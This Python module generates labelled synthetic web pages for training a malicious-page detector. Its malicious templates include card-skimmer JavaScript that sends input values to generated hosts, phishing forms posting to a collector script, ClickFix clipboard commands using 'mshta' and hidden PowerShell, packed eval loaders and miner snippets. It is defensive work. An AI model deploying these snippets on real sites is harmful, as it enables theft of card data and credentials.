"""
Labelled SYNTHETIC web pages for training and testing.

Why synthetic? Real malicious pages are short-lived, often illegal to
redistribute, and dangerous to collect casually; real customer browsing data
is private. So, as the hackathon rules require, we generate clearly labelled
synthetic pages that reproduce the *structure* of each attack class (as
described in public threat research), and we say plainly that results on
synthetic data do not prove real-world accuracy.

Design choices that keep the data honest and the task non-trivial:
* Every page is built from randomised parts (words, domains, layouts,
  scripts), so the model cannot memorise one template.
* Each malicious family has "subtle" variants with some signals removed.
* Benign data includes deliberate HARD NEGATIVES: security blogs quoting scam
  text, docs with "copy install command" buttons, minified bundles with
  base64 data, legitimate downloads, tracking pixels, honest IT-support
  pages. These punish lazy keyword rules.
* All payloads are inert: commands only print a test message, every
  malicious domain uses fictional names, and nothing here is runnable malware.

Every page is a preflight.schema.FetchedPage with is_synthetic=True, so it
flows through exactly the same feature extraction as a live scan.
"""

from __future__ import annotations

import base64
import random
import string
from dataclasses import dataclass
from html import escape

from preflight.schema import FetchedPage

SAFE_TEST_COMMAND = "Write-Output 'PREFLIGHT SYNTHETIC SAMPLE - NOT A REAL PAYLOAD'"


@dataclass
class LabelledPage:
    page: FetchedPage
    label: int        # 1 = malicious, 0 = benign
    family: str       # e.g. "clickfix", "benign_docs"
    url_only: bool = False  # True when content was stripped (augmentation)


# ---------------------------------------------------------------- vocabulary
_WORDS = ("river garden orbit maple harbour copper lantern meadow summit pixel "
          "cedar falcon granite willow ember atlas nimbus coral thistle quartz "
          "beacon canyon fjord saffron tundra velvet aurora bramble cobalt "
          "delta").split()
_TOPICS = ("cooking travel gardening cycling photography finance music chess "
           "astronomy football history coding knitting running climbing").split()
_BENIGN_TLDS = ("com", "co.uk", "org", "net", "io", "uk", "org.uk", "dev", "app")
_SHADY_TLDS = ("top", "xyz", "click", "icu", "online", "site", "info", "com", "net", "live")
_FREE_HOSTS = ("pages.dev", "github.io", "netlify.app", "vercel.app", "web.app")
_BRANDS = (  # (display name, real domain) from threat_data/protected_domains.txt
    ("PayPal", "paypal.com"), ("Microsoft", "microsoft.com"), ("Barclays", "barclays.co.uk"),
    ("Netflix", "netflix.com"), ("Royal Mail", "royalmail.com"), ("Amazon", "amazon.co.uk"),
    ("Santander", "santander.co.uk"), ("Monzo", "monzo.com"), ("Revolut", "revolut.com"),
    ("Northbridge Bank", "northbridge-bank.example"), ("Apple", "apple.com"),
    ("Outlook", "outlook.com"), ("HSBC", "hsbc.co.uk"), ("Evri", "evri.com"),
)
_LOOKALIKE_SWAPS = {"o": "0", "l": "1", "i": "1", "e": "3", "a": "4", "m": "rn"}


class SyntheticWebFactory:
    """Generates random labelled pages. Same seed => same dataset."""

    def __init__(self, seed: int = 7) -> None:
        self.rng = random.Random(seed)

    # ============================================================ public API
    BENIGN_FAMILIES = {
        "benign_blog": 3, "benign_shop": 2, "benign_login": 2, "benign_news": 2,
        "benign_docs": 2, "benign_webapp": 2, "benign_download": 1,
        "benign_security_blog": 1, "benign_it_support": 1, "benign_sso": 1,
        "benign_minimal": 1,
    }
    MALICIOUS_FAMILIES = {
        "credential_phish": 4, "clickfix": 2, "drive_by": 2, "cryptojacking": 1,
        "card_skimmer": 2, "tech_support_scam": 1, "malvertising_redirect": 1,
        "browser_in_browser": 1, "push_spam": 1,
    }

    def generate(self, n_benign: int, n_malicious: int,
                 url_only_fraction: float = 0.12) -> list[LabelledPage]:
        """Build a shuffled dataset with the requested class sizes."""
        samples: list[LabelledPage] = []
        for families, count, label in ((self.BENIGN_FAMILIES, n_benign, 0),
                                       (self.MALICIOUS_FAMILIES, n_malicious, 1)):
            names = list(families)
            weights = [families[n] for n in names]
            for _ in range(count):
                family = self.rng.choices(names, weights)[0]
                page = getattr(self, f"_make_{family}")()
                page.is_synthetic = True
                # Avoid shortcut learning: attack pages often copy a real site's
                # menus and scripts, so "few links" or "little JavaScript" must
                # not be reliable signs of malice on their own.
                if label == 1 and family != "card_skimmer" and self._chance(0.35):
                    self._add_site_chrome(page)
                sample = LabelledPage(page, label, family)
                # Augmentation: some pages lose their content, as when a fetch
                # fails, so the model also learns to judge links on their own.
                if self.rng.random() < url_only_fraction:
                    sample = self._strip_content(sample)
                samples.append(sample)
        self.rng.shuffle(samples)
        return samples

    def make_family(self, family: str) -> LabelledPage:
        """One page of a named family (used by tests and the leave-one-out study)."""
        page = getattr(self, f"_make_{family}")()
        page.is_synthetic = True
        return LabelledPage(page, int(family in self.MALICIOUS_FAMILIES), family)

    # ======================================================= small helpers
    def _chance(self, p: float) -> bool:
        return self.rng.random() < p

    def _word(self) -> str:
        return self.rng.choice(_WORDS)

    def _sentence(self, topic: str | None = None, n: int = 12) -> str:
        topic = topic or self.rng.choice(_TOPICS)
        words = [self._word() for _ in range(n)]
        words.insert(self.rng.randrange(len(words)), topic)
        return " ".join(words).capitalize() + "."

    def _paragraphs(self, k: int, topic: str | None = None) -> str:
        return "".join(f"<p>{self._sentence(topic, self.rng.randint(8, 20))}</p>" for _ in range(k))

    def _random_label(self, length: int) -> str:
        return "".join(self.rng.choice(string.ascii_lowercase + string.digits) for _ in range(length))

    def _benign_domain(self) -> str:
        """Honest domains vary a lot: hyphens, digits, sub-domains, free hosting."""
        name = self._word() + (self._word() if self._chance(0.5) else "")
        if self._chance(0.3):
            name += "-" + self._word() + (f"-{self._word()}" if self._chance(0.2) else "")
        if self._chance(0.1):
            name += str(self.rng.randint(1, 365))
        if self._chance(0.08):  # personal projects on free hosting are normal
            return f"{name}.{self.rng.choice(_FREE_HOSTS)}"
        prefix = self.rng.choice(["www.", "shop.", "blog.", "my."]) if self._chance(0.3) else ""
        return f"{prefix}{name}.{self.rng.choice(_BENIGN_TLDS)}"

    def _shady_domain(self, brand_domain: str | None = None) -> str:
        style = self.rng.random()
        if brand_domain and style < 0.3:
            return self._lookalike(brand_domain)
        if brand_domain and style < 0.5:
            label = brand_domain.split(".")[0]
            return f"{label}.{self._word()}-{self.rng.choice(['secure', 'verify', 'account', 'login'])}.{self.rng.choice(_SHADY_TLDS)}"
        if style < 0.65:
            return f"{self._random_label(self.rng.randint(5, 9))}.{self.rng.choice(_FREE_HOSTS)}"
        if style < 0.85:
            words = self.rng.sample(["secure", "account", "verify", "update", "support",
                                     "service", "online", "auth", "client", "portal"], 2)
            return f"{'-'.join(words)}-{self._random_label(3)}.{self.rng.choice(_SHADY_TLDS)}"
        return f"{self._random_label(self.rng.randint(6, 12))}.{self.rng.choice(_SHADY_TLDS)}"

    def _lookalike(self, real_domain: str) -> str:
        label, _, rest = real_domain.partition(".")
        positions = [i for i, ch in enumerate(label) if ch in _LOOKALIKE_SWAPS]
        if positions:
            i = self.rng.choice(positions)
            label = label[:i] + _LOOKALIKE_SWAPS[label[i]] + label[i + 1:]
        else:
            label = label + self.rng.choice(["-login", "-secure", "s"])
        tld = rest if self._chance(0.4) else self.rng.choice(_SHADY_TLDS)
        return f"{label}.{tld}"

    def _url(self, domain: str, *, https: bool = True, path: str | None = None) -> str:
        path = path if path is not None else "/" + "/".join(
            self._word() for _ in range(self.rng.randint(0, 3)))
        return f"{'https' if https else 'http'}://{domain}{path}"

    def _page(self, url: str, html: str, *, chain: list[str] | None = None,
              headers: dict[str, str] | None = None, scripts: dict[str, str] | None = None,
              content_type: str = "text/html; charset=utf-8",
              binary_signature: str = "") -> FetchedPage:
        chain = chain or [url]
        return FetchedPage(requested_url=chain[0], final_url=chain[-1], status=200,
                           headers=headers or {"content-type": content_type},
                           body=html, content_type=content_type, redirect_chain=chain,
                           external_scripts=scripts or {}, binary_signature=binary_signature)

    def _nav(self, domain: str, k: int | None = None) -> str:
        k = k or self.rng.randint(4, 12)
        links = "".join(f'<a href="/{self._word()}">{self._word().title()}</a>' for _ in range(k))
        return f"<nav>{links}</nav>"

    def _footer(self, domain: str, external: int | None = None) -> str:
        external = self.rng.randint(0, 4) if external is None else external
        own = "".join(f'<a href="/{w}">{w.title()}</a>' for w in ("privacy", "terms", "contact", "about"))
        ext = "".join(f'<a href="https://{self._benign_domain()}/">{self._word()}</a>' for _ in range(external))
        # Honest sites mention big brands all the time (social links, payment
        # logos), so a brand name in the text must not look suspicious by itself.
        social = ""
        if self._chance(0.5):
            mentions = self.rng.sample([
                ("Follow us on Instagram", "https://www.instagram.com/"),
                ("Like us on Facebook", "https://www.facebook.com/"),
                ("We accept PayPal", "https://www.paypal.com/"),
                ("Find us on LinkedIn", "https://www.linkedin.com/"),
                ("Also on Amazon", "https://www.amazon.co.uk/"),
                ("Watch on Netflix", "https://www.netflix.com/"),
            ], self.rng.randint(1, 3))
            social = "".join(f'<a href="{href}">{text}</a>' for text, href in mentions)
        return f"<footer>{own}{ext}{social}<p>&copy; 2026 {escape(domain)}</p></footer>"

    def _wrap(self, title: str, body: str, head_extra: str = "") -> str:
        return (f"<!doctype html><html><head><meta charset='utf-8'><title>{escape(title)}</title>"
                f"{head_extra}</head><body>{body}</body></html>")

    # ----------------------------------------------------- benign script parts
    def _analytics_script(self) -> str:
        site_id = self._random_label(8).upper()
        return (f"<script async src='https://www.googletagmanager.com/gtag/js?id=G-{site_id}'></script>"
                "<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}"
                f"gtag('js',new Date());gtag('config','G-{site_id}');</script>")

    def _minified_bundle(self) -> str:
        """Looks like real minified framework code (a hard negative for 'obfuscation')."""
        parts = []
        for _ in range(self.rng.randint(15, 60)):
            a, b = self.rng.sample(string.ascii_lowercase, 2)
            parts.append(f"function {a}{self._random_label(2)}({a},{b}){{return {a}&&{b}?{a}.concat({b}):[]}}")
        if self._chance(0.4):  # base64 web font: long, high-entropy, perfectly honest
            blob = base64.b64encode(self.rng.randbytes(self.rng.randint(300, 900))).decode()
            parts.append(f"var font='data:font/woff2;base64,{blob}'")
        if self._chance(0.3):  # legit use of atob for config decoding
            parts.append("var cfg=JSON.parse(atob(window.__CFG__||'e30='))")
        if self._chance(0.15):  # some old libraries still use eval-like patterns
            parts.append("var tpl=new Function('d','return d.name')")
        return "<script>" + ";".join(parts) + "</script>"

    def _cdn_scripts(self, k: int) -> str:
        cdns = ["https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js",
                "https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js",
                "https://unpkg.com/react@18/umd/react.production.min.js",
                "https://js.stripe.com/v3/", "https://static.cloudflareinsights.com/beacon.min.js"]
        return "".join(f"<script src='{src}'></script>" for src in self.rng.sample(cdns, min(k, len(cdns))))

    def _gtm_noscript(self) -> str:
        return ("<noscript><iframe src='https://www.googletagmanager.com/ns.html?id=GTM-"
                f"{self._random_label(6).upper()}' height='0' width='0' "
                "style='display:none;visibility:hidden'></iframe></noscript>")

    def _add_site_chrome(self, page: FetchedPage) -> None:
        host = page.final_url.split("/")[2] if "://" in page.final_url else "site"
        if "<body>" in page.body:
            page.body = page.body.replace("<body>", "<body>" + self._nav(host), 1)
            page.body = page.body.replace("</body>", self._footer(host) + "</body>", 1)
        if "</head>" in page.body and self._chance(0.6):
            # ...and their scripts, so "little JavaScript" isn't a giveaway either.
            page.body = page.body.replace("</head>", self._minified_bundle() + "</head>", 1)

    # ===================================================== BENIGN families
    def _make_benign_minimal(self) -> FetchedPage:
        """Landing / coming-soon / parked pages: honest but with very few links."""
        domain = self._benign_domain()
        kind = self.rng.random()
        if kind < 0.4:
            body = (f"<h1>{self._word().title()} is coming soon</h1><p>{self._sentence()}</p>"
                    "<form action='/notify' method='post'><input type='email' name='email'>"
                    "<button>Notify me</button></form>")
        elif kind < 0.7:
            body = f"<h1>{escape(domain)}</h1><p>This domain is registered. Contact the owner.</p>"
        else:
            body = (f"<h1>{self._word().title()}</h1><p>{self._sentence()}</p>"
                    f"<a href='https://{self._benign_domain()}/'>Portfolio</a>")
        head = self._analytics_script() if self._chance(0.4) else ""
        return self._page(self._url(domain, path="/"), self._wrap(self._word().title(), body, head))

    def _make_benign_blog(self) -> FetchedPage:
        domain = self._benign_domain()
        topic = self.rng.choice(_TOPICS)
        extras = self._analytics_script() if self._chance(0.7) else ""
        if self._chance(0.4):
            extras += self._gtm_noscript()
        newsletter = ("<form action='/subscribe' method='post'><input type='email' name='email'>"
                      "<button>Subscribe</button></form>") if self._chance(0.5) else ""
        body = (self._nav(domain) + f"<h1>{topic.title()} notes</h1>" +
                self._paragraphs(self.rng.randint(3, 12), topic) + newsletter + self._footer(domain))
        return self._page(self._url(domain, https=self._chance(0.93)),
                          self._wrap(f"{topic.title()} | {domain}", body, extras))

    def _make_benign_shop(self) -> FetchedPage:
        domain = self._benign_domain()
        products = "".join(f"<div class='p'><h3>{self._word().title()} {self._word()}</h3>"
                           f"<span>£{self.rng.randint(3, 400)}</span><a href='/p/{self._word()}'>View</a></div>"
                           for _ in range(self.rng.randint(4, 20)))
        checkout = ""
        if self._chance(0.5):
            # A same-site checkout that collects card data honestly.
            checkout = ("<form action='/checkout/pay' method='post'>"
                        "<input name='name' autocomplete='cc-name'>"
                        "<input name='cardnumber' autocomplete='cc-number'>"
                        "<input name='exp' autocomplete='cc-exp'><input name='cvc' autocomplete='cc-csc'>"
                        "<button>Pay</button></form>")
        scripts = self._cdn_scripts(self.rng.randint(1, 4)) + self._minified_bundle()
        if self._chance(0.3):  # payment provider iframe, visible
            scripts += "<iframe src='https://js.stripe.com/v3/elements-inner' width='400' height='60'></iframe>"
        body = self._nav(domain) + "<h1>Shop</h1>" + products + checkout + self._footer(domain)
        return self._page(self._url(domain), self._wrap(f"{self._word().title()} Store", body, scripts))

    def _make_benign_login(self) -> FetchedPage:
        if self._chance(0.5):
            brand, domain = self.rng.choice(_BRANDS)
            host = f"{self.rng.choice(['www', 'login', 'secure', 'signin'])}.{domain}"
        else:
            domain = self._benign_domain()
            brand, host = domain.split(".")[0].title(), domain
        action = self.rng.choice(["/login", "/session", f"https://{host}/auth"])
        warning = ("<p>We will never ask for your password by email. Your account will be "
                   "locked after 5 failed attempts.</p>") if self._chance(0.3) else ""
        body = (self._nav(host) + f"<h1>Sign in to {escape(brand)}</h1>" + warning +
                f"<form action='{action}' method='post'><input name='email' type='email'>"
                "<input name='password' type='password'><button>Sign in</button></form>"
                "<a href='/forgot'>Forgot password?</a>" + self._footer(host))
        head = self._cdn_scripts(self.rng.randint(0, 2)) + self._minified_bundle()
        return self._page(self._url(host, path="/login"), self._wrap(f"Sign in - {brand}", body, head))

    def _make_benign_news(self) -> FetchedPage:
        domain = self._benign_domain()
        ads = "".join(f"<iframe src='https://ads.{self._benign_domain()}/slot' width='300' height='250'></iframe>"
                      for _ in range(self.rng.randint(0, 3)))
        pixel = (f"<iframe src='https://pixel.{self._benign_domain()}/t' width='1' height='1'></iframe>"
                 if self._chance(0.25) else "")  # honest tracking pixel: hard negative
        scripts = self._analytics_script() + self._cdn_scripts(self.rng.randint(2, 5)) + self._minified_bundle()
        if self._chance(0.3):
            scripts += "<script>document.write('<div id=\"ad-'+Math.random()+'\"></div>')</script>"
        body = (self._nav(domain, self.rng.randint(10, 30)) + f"<h1>{self._sentence(n=6)}</h1>" +
                self._paragraphs(self.rng.randint(5, 15)) + ads + pixel + self._footer(domain, 6))
        return self._page(self._url(domain), self._wrap(self._sentence(n=5), body, scripts))

    def _make_benign_docs(self) -> FetchedPage:
        """Developer docs: shows shell commands and offers 'copy' buttons (hard negative)."""
        domain = f"docs.{self._benign_domain()}"
        tool = self._word()
        command = self.rng.choice([
            f"curl -sSL https://get.{tool}.dev/install.sh | sh",
            f"powershell -c \"irm https://get.{tool}.dev/install.ps1 | iex\"",
            f"pip install {tool}", f"npm install -g {tool}",
        ])
        copy_js = (f"<button onclick=\"navigator.clipboard.writeText('{escape(command)}')\">Copy</button>"
                   if self._chance(0.7) else "")
        body = (self._nav(domain) + f"<h1>Installing {tool}</h1>" + self._paragraphs(2) +
                f"<pre><code>{escape(command)}</code></pre>{copy_js}" +
                "<p>Avoid eval() in your own code.</p>" + self._paragraphs(3) + self._footer(domain))
        return self._page(self._url(domain, path="/install"),
                          self._wrap(f"{tool} docs", body, self._minified_bundle()))

    def _make_benign_webapp(self) -> FetchedPage:
        domain = f"app.{self._benign_domain()}"
        code = ["const ws=new WebSocket('wss://" + domain + "/live')",
                "if(!user){window.location.href='/login'}",
                "document.getElementById('q').addEventListener('input',e=>"
                "fetch('/api/suggest?q='+encodeURIComponent(e.target.value)))"]
        if self._chance(0.3):
            code.append("const w=new Worker('/static/worker.js')")
        if self._chance(0.2):
            code.append("WebAssembly.instantiateStreaming(fetch('/img.wasm'))")  # e.g. image editor
        body = "<div id='root'></div><input id='q' placeholder='Search'>" + self._footer(domain, 0)
        head = self._minified_bundle() + "<script>" + ";".join(code) + "</script>"
        return self._page(self._url(domain, path="/"), self._wrap(f"{self._word().title()} App", body, head))

    def _make_benign_download(self) -> FetchedPage:
        domain = self._benign_domain()
        product = self._word().title()
        if self._chance(0.3):  # the link itself is the installer, same site
            url = self._url(domain, path=f"/files/{product}Setup.exe")
            return self._page(url, "", content_type="application/octet-stream",
                              headers={"content-type": "application/octet-stream",
                                       "content-disposition": f"attachment; filename={product}Setup.exe"},
                              binary_signature="windows-executable")
        body = (self._nav(domain) + f"<h1>Download {product}</h1>" + self._paragraphs(2) +
                f"<a href='/files/{product}Setup.exe' download>Windows</a>"
                f"<a href='/files/{product}.dmg'>macOS</a>" + self._footer(domain))
        return self._page(self._url(domain, path="/download"),
                          self._wrap(f"Download {product}", body, self._analytics_script()))

    def _make_benign_security_blog(self) -> FetchedPage:
        """An article ABOUT scams that quotes scam text (hard negative)."""
        domain = self._benign_domain()
        quotes = self.rng.sample([
            "\"Your account will be suspended within 24 hours\"",
            "\"Press Windows + R and paste the code to verify you are human\"",
            "\"Your computer is infected, call Microsoft support\"",
            "\"Your browser is out of date\"",
            "\"Click Allow to continue\"",
        ], 2)
        body = (self._nav(domain) + "<h1>How to spot a scam</h1>" + self._paragraphs(2) +
                "".join(f"<blockquote>{escape(q)}</blockquote>" for q in quotes) +
                self._paragraphs(3) + self._footer(domain))
        return self._page(self._url(domain), self._wrap("Spotting scams", body, self._analytics_script()))

    def _make_benign_it_support(self) -> FetchedPage:
        domain = self._benign_domain()
        phone = f"0{self.rng.randint(1000, 9999)} {self.rng.randint(100000, 999999)}"
        body = (self._nav(domain) + "<h1>Local computer repair</h1>"
                "<p>Virus removal, laptop screens and data recovery. Call our helpline on "
                f"{phone}.</p>" + self._paragraphs(3) + self._footer(domain))
        return self._page(self._url(domain), self._wrap("PC Repair", body))

    def _make_benign_sso(self) -> FetchedPage:
        """Company intranet whose login posts to its own identity provider (cross-site, honest)."""
        org = self._word()
        domain, idp = f"{org}-intranet.com", f"login.{org}-identity.com"
        body = (f"<h1>{org.title()} staff portal</h1><form action='https://{idp}/authorize' method='post'>"
                "<input name='username'><input type='password' name='password'><button>Continue</button>"
                "</form>" + self._footer(domain, 0))
        return self._page(self._url(domain, path="/"), self._wrap(f"{org.title()} portal", body))

    # ================================================== MALICIOUS families
    def _make_credential_phish(self) -> FetchedPage:
        brand, real = self.rng.choice(_BRANDS)
        domain = self._shady_domain(real)
        path = self.rng.choice(["/login", "/verify/account", "/secure/signin.php", "/", "/update-billing"])
        url = self._url(domain, https=self._chance(0.85), path=path)
        variant = self.rng.random()
        collector = f"https://{self._shady_domain()}/gate.php"
        if variant < 0.45:
            action = collector                          # classic: post to another site
        elif variant < 0.75:
            action = "/next.php"                        # same site, relies on look-alike/brand
        else:
            action = ""                                 # JS sends the data
        show_brand = self._chance(0.85)
        title = f"Sign in - {brand}" if show_brand else self.rng.choice(["Webmail", "Account", "Login"])
        urgency = ("<p class='warn'>Unusual sign-in activity. Verify your account within 24 hours "
                   "or your account will be suspended.</p>") if self._chance(0.6) else ""
        # Links copied from the real site point back to it (high external ratio).
        real_links = "".join(f"<a href='https://www.{real}/{w}'>{w}</a>"
                             for w in self.rng.sample(["help", "privacy", "terms", "security"], self.rng.randint(0, 4)))
        script = ""
        if action == "":
            script = ("<script>document.forms[0].addEventListener('submit',function(e){e.preventDefault();"
                      f"fetch('{collector}',{{method:'POST',body:new FormData(this)}}).then(function()"
                      f"{{location.href='https://www.{real}/'}})}})</script>")
        elif self._chance(0.3):
            script = "<script>" + self._packed_js("console.log('step')") + "</script>"
        body = (f"<div class='box'><h2>{escape(title)}</h2>{urgency}"
                f"<form action='{action}' method='post'><input name='email' placeholder='Email or phone'>"
                "<input type='password' name='pass' placeholder='Password'><button>Next</button></form>"
                f"{real_links}</div>{script}")
        return self._page(url, self._wrap(title, body))

    def _packed_js(self, inner: str) -> str:
        """Inert 'packed loader' shape: decode a string, then run it."""
        encoded = base64.b64encode((inner + ";/*" + self._random_label(self.rng.randint(150, 400)) + "*/").encode()).decode()
        style = self.rng.random()
        if style < 0.4:
            return f"var _0x{self._random_label(4)}='{encoded}';eval(atob(_0x{self._random_label(4)}||'{encoded}'))"
        if style < 0.7:
            codes = ",".join(str(ord(c)) for c in inner)
            return f"eval(String.fromCharCode({codes}));var _p='{encoded}'"
        hexed = "".join(f"\\x{ord(c):02x}" for c in inner)
        return f"var _h='{hexed}';new Function(unescape(escape(_h)))();var _b='{encoded}'"

    def _make_clickfix(self) -> FetchedPage:
        domain = self._shady_domain() if self._chance(0.6) else self._benign_domain()  # often hacked sites
        url = self._url(domain)
        command = self.rng.choice([
            f"powershell -w hidden -c \"{SAFE_TEST_COMMAND}\"",
            f"mshta https://{self._shady_domain()}/verify # {SAFE_TEST_COMMAND}",
            f"cmd /c echo {SAFE_TEST_COMMAND}",
        ])
        js_command = command.replace("\\", "\\\\").replace("'", "\\'")
        copy_code = self.rng.choice([
            f"navigator.clipboard.writeText('{js_command}')",
            f"var t=document.createElement('textarea');t.value='{js_command}';document.body.appendChild(t);"
            "t.select();document.execCommand('copy');t.remove()",
        ])
        instructions = self.rng.choice([
            "<ol><li>Press Windows + R</li><li>Press Ctrl + V</li><li>Press Enter</li></ol>",
            "<p>To complete verification steps: press the Windows key + R, paste it and press Enter.</p>",
            "<p>Open the Run dialog and paste the code to continue.</p>",
        ]) if self._chance(0.85) else ""
        head_scripts: dict[str, str] = {}
        if self._chance(0.4):  # payload kept in an external file
            src = f"https://{self._shady_domain()}/c.js"
            head_scripts[src] = f"function verify(){{{copy_code}}}"
            head = f"<script src='{src}'></script>"
        else:
            head = f"<script>function verify(){{{copy_code}}}</script>"
        body = ("<div style='position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#fff'>"
                "<h2>Verify you are human</h2><button onclick='verify()'>I'm not a robot</button>"
                f"{instructions}</div>")
        if self._chance(0.4):
            body = self._paragraphs(3) + body  # injected into an ordinary page
        return self._page(url, self._wrap(self.rng.choice(["Just a moment...", "Verification", self._word()]),
                                          body, head), scripts=head_scripts)

    def _make_drive_by(self) -> FetchedPage:
        domain = self._benign_domain() if self._chance(0.5) else self._shady_domain()
        url = self._url(domain)
        drop = f"https://{self._shady_domain()}/{self.rng.choice(['update', 'setup', 'chrome_update', 'install'])}" \
               f".{self.rng.choice(['exe', 'msi', 'hta', 'apk', 'js', 'zip'])}"
        parts = [self._paragraphs(self.rng.randint(0, 4))]
        if self._chance(0.7):
            for _ in range(self.rng.randint(1, 3)):
                parts.append(f"<iframe src='https://{self._shady_domain()}/x' width='0' height='0' "
                             "style='display:none'></iframe>")
        if self._chance(0.5):
            parts.append("<h1>Your browser is out of date</h1><p>Critical update required to view this page.</p>")
        head = ""
        if self._chance(0.5):
            head += f"<meta http-equiv='refresh' content='{self.rng.randint(0, 3)};url={drop}'>"
        if self._chance(0.6):
            head += "<script>" + self._packed_js(f"location.href='{drop}'") + f";var _d='{drop}';location.replace(_d)</script>"
        if self._chance(0.2):  # the link itself serves the program
            return self._page(url, "", chain=[url, drop], content_type="application/octet-stream",
                              headers={"content-type": "application/octet-stream"},
                              binary_signature="windows-executable")
        return self._page(url, self._wrap(self._word().title(), "".join(parts), head))

    def _make_cryptojacking(self) -> FetchedPage:
        domain = self._benign_domain() if self._chance(0.6) else self._shady_domain()
        lib = self.rng.choice(["coinhive.min.js", "cryptonight.wasm.js", "deepMiner.js", "webminepool.js", "lib.js"])
        src = f"https://{self._shady_domain()}/{lib}"
        miner = (f"var miner=new CoinHive.Anonymous('{self._random_label(20)}',{{throttle:0.{self.rng.randint(1, 5)}}});"
                 "miner.start();" if self._chance(0.5) else
                 f"var w=[];for(var i=0;i<navigator.hardwareConcurrency;i++){{w.push(new Worker('/m.js'))}}"
                 f";var s=new WebSocket('wss://{self._shady_domain()}/pool');// cryptonight")
        external = {src: "WebAssembly.instantiate(buf);function cryptoNightHash(){}" if self._chance(0.6) else "var x=1"}
        body = self._nav(domain) + self._paragraphs(self.rng.randint(2, 8)) + self._footer(domain)
        return self._page(self._url(domain), self._wrap(self._sentence(n=4), body,
                          f"<script src='{src}'></script><script>{miner}</script>"), scripts=external)

    def _make_card_skimmer(self) -> FetchedPage:
        """A normal-looking shop with an injected skimmer (very few visible signs)."""
        page = self._make_benign_shop()
        page_html = page.body
        if "cardnumber" not in page_html:
            page_html = page_html.replace("</body>", (
                "<form action='/checkout/pay' method='post'><input name='cardnumber' autocomplete='cc-number'>"
                "<input name='cvc' autocomplete='cc-csc'><button>Pay</button></form></body>"))
        exfil_host = self._shady_domain() if self._chance(0.5) else \
            f"{self.rng.choice(['cdn', 'static', 'analytics'])}-{self._word()}.{self.rng.choice(['com', 'net', 'top'])}"
        skimmer = (
            "document.querySelectorAll('input').forEach(function(i){i.addEventListener('change',"
            f"function(){{new Image().src='https://{exfil_host}/i.gif?d='+btoa(i.name+'='+i.value)}})}})"
            if self._chance(0.6) else
            "window.addEventListener('keyup',function(e){var d=document.querySelector('[name=cardnumber]').value;"
            f"navigator.sendBeacon('https://{exfil_host}/c',d)}})")
        if self._chance(0.5):
            skimmer = self._packed_js("void 0") + ";" + skimmer
        scripts = dict(page.external_scripts)
        if self._chance(0.5):  # injected as a third-party file
            src = f"https://{exfil_host}/jquery.min.js"
            scripts[src] = skimmer
            page_html = page_html.replace("</head>", f"<script src='{src}'></script></head>")
        else:
            page_html = page_html.replace("</body>", f"<script>{skimmer}</script></body>")
        page.body = page_html
        page.external_scripts = scripts
        return page

    def _make_tech_support_scam(self) -> FetchedPage:
        domain = self._shady_domain()
        phone = f"+1-8{self.rng.randint(0, 9)}{self.rng.randint(0, 9)}-{self.rng.randint(100, 999)}-{self.rng.randint(1000, 9999)}"
        code = []
        if self._chance(0.8):
            code.append("document.documentElement.requestFullscreen()")
        if self._chance(0.7):
            code.append("setInterval(function(){alert('Your computer is infected! Call " + phone + "')},800)")
        if self._chance(0.6):
            code.append("window.onbeforeunload=function(){return 'Do not close'}")
        body = (f"<h1>Windows Defender Alert</h1><p>Your PC has been blocked. Viruses detected: "
                f"{self.rng.randint(3, 9)}. Error code #{self._random_label(6).upper()}. "
                f"Call Microsoft Support toll-free {phone}. Do not close this window.</p>")
        return self._page(self._url(domain, https=self._chance(0.6)),
                          self._wrap("Security Alert", body, f"<script>{';'.join(code)}</script>"))

    def _make_malvertising_redirect(self) -> FetchedPage:
        hops = [self._url(self._benign_domain(), path="/ad?c=" + self._random_label(8))]
        for _ in range(self.rng.randint(1, 3)):
            hops.append(self._url(self._shady_domain(), path="/r?" + self._random_label(10)))
        landing = self.rng.choice([self._make_credential_phish, self._make_tech_support_scam,
                                   self._make_push_spam, self._make_drive_by])()
        hops.append(landing.final_url)
        landing.redirect_chain = hops
        landing.requested_url = hops[0]
        if self._chance(0.5):
            landing.body = landing.body.replace("</head>", "<script>if(navigator.webdriver){location.replace('https://www.google.com')}</script></head>")
        return landing

    def _make_browser_in_browser(self) -> FetchedPage:
        brand, real = self.rng.choice([b for b in _BRANDS if b[1] in
                                       ("microsoft.com", "apple.com", "northbridge-bank.example", "paypal.com", "outlook.com")])
        domain = self._shady_domain() if self._chance(0.7) else self._benign_domain()
        fake_url = f"https://login.{real}/oauth2/authorize"
        frame_src = f"https://{self._shady_domain(real)}/frame"
        popup = ("<div style='position:fixed;top:80px;left:30%;width:480px;z-index:10000;box-shadow:0 0 20px #000'>"
                 f"<div class='titlebar'><span class='lock'></span><span class='addr'>{fake_url}</span></div>"
                 f"<iframe src='{frame_src}' width='480' height='520'></iframe></div>")
        body = self._nav(domain) + f"<h1>Continue with {brand}</h1>" + self._paragraphs(2) + popup
        return self._page(self._url(domain), self._wrap(f"Sign in with {brand}", body))

    def _make_push_spam(self) -> FetchedPage:
        domain = self._shady_domain()
        text = self.rng.choice(["Click Allow to verify that you are not a robot",
                                "Press Allow to continue watching", "Click \"Allow\" to download your file"])
        code = ("Notification.requestPermission().then(function(p){if(p==='granted'){navigator."
                "serviceWorker.register('/sw.js')}})")
        if self._chance(0.4):
            code += ";window.open('https://" + self._shady_domain() + "/offer')"
        body = f"<div class='center'><h1>{text}</h1><img src='/arrow.png'></div>"
        return self._page(self._url(domain, path="/?sub=" + self._random_label(6)),
                          self._wrap(self.rng.choice(["Press Allow", "Loading...", "Verification"]),
                                     body, f"<script>{code}</script>"))

    # ============================================================ augmentation
    @staticmethod
    def _strip_content(sample: LabelledPage) -> LabelledPage:
        """Simulate a failed fetch: keep only the URL."""
        page = sample.page
        stripped = FetchedPage(requested_url=page.requested_url, final_url=page.requested_url,
                               status=None, fetch_error="synthetic: content withheld",
                               redirect_chain=[page.requested_url], is_synthetic=True)
        return LabelledPage(stripped, sample.label, sample.family, url_only=True)
